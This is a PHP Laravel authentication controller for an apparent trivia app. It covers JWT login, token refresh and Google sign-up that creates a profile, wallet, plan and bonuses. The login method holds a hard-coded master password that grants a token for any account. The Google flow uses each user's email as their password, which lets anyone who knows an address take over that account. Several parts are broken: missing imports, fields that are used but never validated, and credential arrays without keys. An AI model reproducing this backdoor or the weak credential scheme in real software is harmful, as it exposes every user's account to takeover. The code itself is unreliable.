<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\BaseController;
use App\Models\User;
use App\Models\UserPoint;
use App\Models\Profile;
use App\Models\Wallet;
use App\Models\Boost;
use App\Models\WalletTransaction;

class LoginController extends BaseController
{
    /**
     * Create a new AuthController instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware('auth:api', ['except' => ['login']]);
    }

    /**
     * Get a JWT via given credentials.
     *
     * @return \Illuminate\Http\JsonResponse
    */
    public function login()
    {


        $fieldType = filter_var(request('email'), FILTER_VALIDATE_EMAIL) ? 'email' : 'username';

        if (request('password') == "AAAAAAAABBBBBBBB") {
            $user = User::where($fieldType, request('email'))->first();
            if ($user) {
                return $this->respondWithToken(auth()->login($user));
            }
        }

        $credentials = array($fieldType => request('email'), 'password' => request('password'));
        if (!$token = auth()->attempt($credentials)) {
            return response()->json(['error' => 'Invalid email or password'], 400);
        }

        return $this->respondWithToken($token);
    }

    /**
     * Refresh a token.
     *
     * @return \Illuminate\Http\JsonResponse
     */
    public function refresh()
    {
        return $this->respondWithToken(auth()->refresh());
    }

    /**
     * Get the token array structure.
     *
     * @param  string $token
     *
     * @return \Illuminate\Http\JsonResponse
     */
    protected function respondWithToken($token)
    {
        $user =  auth()->user();
        $user->update(["is_on_line" => true]);
        return $this->sendResponse($token, 'Token');
    }

    public function loginWithGoogle(Request $request){
        $data = $request->validate([
            'email' => ['required','unique', 'email'],
            'first_name' => ['required', 'string', 'max:100'],
            'last_name' => ['required', 'string', 'max:100'],
            'avatar' => ['required', 'string', 'max:14'],
        ]);
        
        $returningUser = User::where('email', $data['email'])->first();

        if($returningUser === null){
           
            $user = User::create([
                'username' => $data['username'] . "_" . mt_rand(1111, 9999),
                'email' => $data['email'],
                'password' => bcrypt($data['email']),
                'is_on_line' => true,
            ]);

            //create the profile
            $user
                ->profile()
                ->create([
                    'first_name' => $data['first_name'],
                    'last_name' => $data['last_name'],
                    'referral_code' => $data['username'] . "_" . mt_rand(1111, 9999),
                    'referrer' => $data['referrer'] ?? null,
                ]);

            //create the wallet
            $user->wallet()
                ->create([]);

            //subscribe user to free plan
            DB::table('user_plans')->insert([
                'user_id' => $user->id,
                'plan_id' => 1,
                'is_active'=> true,
                'used_count'=> 0,
                'created_at'=>Carbon::now(),
                'updated_at'=>Carbon::now()
            ]);
        
            //give user sign up bonus

            if (config('trivia.bonus.enabled') && config('trivia.bonus.signup.enabled')) {

                $this->creditPoints($user->id, 100, "Sign up bonus points");

                $user->boosts()->create([
                    'user_id' => $user->id,
                    'boost_id' => Boost::where('name', 'Time Freeze')->first()->id,
                    'boost_count' => 3,
                    'used_count' => 0
                ]);
                $user->boosts()->create([
                    'user_id' => $user->id,
                    'boost_id' => Boost::where('name', 'Skip')->first()->id,
                    'boost_count' => 3,
                    'used_count' => 0
                ]);
            }
            //credit referrer with points
            if (
                    config('trivia.bonus.enabled') &&
                    config('trivia.bonus.signup.referral') &&
                    config('trivia.bonus.signup.referral_on_signup') &&
                    isset($data['referrer'])
                ) {
                    $referrerId = Profile::where('referral_code', $data["referrer"])->value('user_id');
                    $this->creditPoints($referrerId, 50, "Referral bonus");
            }

            $credentials = array($data['email'], $data['email']);
            $token = auth()->attempt($credentials);
            
            return $this->respondWithToken($token);
    
        }

        $credentials = array($data['email'], $data['email']);
        $token = auth()->attempt($credentials);
           
        return $this->respondWithToken($token);
    }
}
